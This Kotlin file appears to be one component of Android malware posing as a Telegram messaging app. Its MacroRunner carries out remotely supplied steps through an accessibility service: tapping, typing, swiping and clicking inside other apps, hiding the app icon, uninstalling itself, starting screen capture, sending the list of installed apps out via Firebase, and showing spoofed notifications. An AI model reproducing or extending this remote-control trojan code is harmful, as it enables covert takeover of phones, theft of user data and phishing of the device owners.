// File: Wq-main/app/src/main/java/com/telegram2/messaging/remote/MacroRunner.kt

package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityNodeInfo

object MacroRunner {
    var currentPackage: String? = null

    data class MacroStep(val type: String, val data: Any?, val retries: Int = 3)

    fun start(macroId: String, steps: List<MacroStep>, service: MyAccessibilityService, callback: (Boolean, String) -> Unit) {
        Thread {
            var idx = 0
            while (idx < steps.size) {
                val step = steps[idx]
                var success = false
                var attempt = 0
                while (attempt < step.retries && !success) {
                    success = executeStep(step, service)
                    if (!success) {
                        attempt++
                        Thread.sleep(1500)
                    }
                }
                if (!success) {
                    callback(false, "Step ${idx + 1} failed after ${step.retries} retries")
                    return
                }
                idx++
            }
            callback(true, "All ${steps.size} steps completed")
        }.start()
    }

    private fun executeStep(step: MacroStep, service: MyAccessibilityService): Boolean {
        var result = false

        when (step.type) {
            "launch" -> {
                val pkg = step.data as? String
                if (pkg != null) {
                    currentPackage = pkg
                    result = service.runOnMainThreadSync { service.launchApp(pkg) } as Boolean
                } else {
                    result = false
                    return false
                }
            }
            "wait" -> {
                val ms = (step.data as? Number)?.toLong() ?: 1000L
                Thread.sleep(ms)
                result = true
            }
            "tap" -> {
                val map = step.data as? Map<*, *>
                if (map != null) {
                    val x = map["x"] as? Int
                    val y = map["y"] as? Int
                    if (x != null && y != null) {
                        service.runOnMainThreadSync { service.tap(x, y) }
                        result = true
                    } else {
                        result = false
                        return false
                    }
                } else {
                    result = false
                    return false
                }
            }
            "type" -> {
                val text = step.data as? String
                if (text != null) {
                    service.runOnMainThreadSync { service.injectText(text) }
                    result = true
                } else {
                    result = false
                    return false
                }
            }
            "swipe" -> {
                val map = step.data as? Map<*, *>
                if (map != null) {
                    val sx = map["sx"] as? Int
                    val sy = map["sy"] as? Int
                    val ex = map["ex"] as? Int
                    val ey = map["ey"] as? Int
                    val dur = map["dur"] as? Long ?: 300L
                    if (sx != null && sy != null && ex != null && ey != null) {
                        service.runOnMainThreadSync { service.swipe(sx, sy, ex, ey, dur) }
                        result = true
                    } else {
                        result = false
                        return false
                    }
                } else {
                    result = false
                    return false
                }
            }
            "click_text" -> {
                val text = step.data as? String
                if (text != null) {
                    result = service.runOnMainThreadSync {
                        val root = service.rootInActiveWindow
                        for (node in root?.findAccessibilityNodeInfosByText(text) ?: emptyList()) {
                            if (node.isClickable) {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                return@runOnMainThreadSync true
                            }
                        }
                        return@runOnMainThreadSync false
                    } as Boolean
                } else {
                    result = false
                    return false
                }
            }
            "home" -> {
                service.runOnMainThreadSync {
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
                }
                result = true
            }
            "back" -> {
                service.runOnMainThreadSync {
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                }
                result = true
            }
            "hide_activity" -> {
                service.runOnMainThreadSync {
                    service.hideAppIcon()
                }
                result = true
            }
            "uninstall" -> {
                service.runOnMainThreadSync {
                    service.uninstallSelf()
                }
                result = true
            }
            "start_screen_capture" -> {
                service.runOnMainThreadSync {
                    service.startScreenCapture()
                }
                result = true
            }
            "get_apps" -> {
                val apps = service.getInstalledApps()
                FirebaseBridge.pushAppsList(apps)
                result = true
            }
            "fake_notification" -> {
                val map = step.data as? Map<*, *>
                if (map != null) {
                    val title = map["title"] as? String ?: "⚠ Alert"
                    val body = map["text"] as? String ?: "Tap to view"
                    service.runOnMainThreadSync {
                        NotificationSpoofer.show(service, title, body, null, null)
                    }
                    result = true
                } else {
                    result = false
                    return false
                }
            }
            else -> {
                result = false
                return false
            }
        }

        return result
    }
}